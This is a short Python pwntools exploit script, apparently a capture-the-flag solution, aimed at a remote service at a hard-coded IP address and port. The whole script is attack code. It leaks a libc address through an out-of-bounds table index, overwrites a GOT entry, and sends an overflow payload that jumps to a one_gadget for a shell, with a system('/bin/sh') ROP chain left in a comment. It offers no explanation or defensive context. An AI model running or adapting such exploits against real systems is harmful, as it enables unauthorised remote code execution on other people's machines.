from pwn import*
p = remote('66.172.27.144',9004)
elf = ELF('./main')
libc= ELF('./libc-2.27.so')
#context.log_level ='DEBUG'
ope = 0x600E00
def leak(idx,addr):
	p.sendlineafter('Operator:',str(idx))
	p.sendlineafter('x =',str(addr))
offset = (elf.got['puts'] - ope)/8 + 1
addr = elf.got['__libc_start_main']
leak(offset,addr)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__libc_start_main']
libc.address = libc_base
og = [0x4F2C5,0x4F322,0x10A38C]
pop_rdi_ret = 0x4008D3
system = libc.sym['system']
binsh = libc_base +  0x1B3E9A
offset = (elf.got['__isoc99_scanf'] - ope)/8 + 1
leak(offset,0x400916)
payload = 'U'*0x2C + p64(libc_base + og[1])#p64(pop_rdi_ret) + p64(binsh) + p64(system) 
p.sendline(payload)
p.sendline('0')
p.interactive()
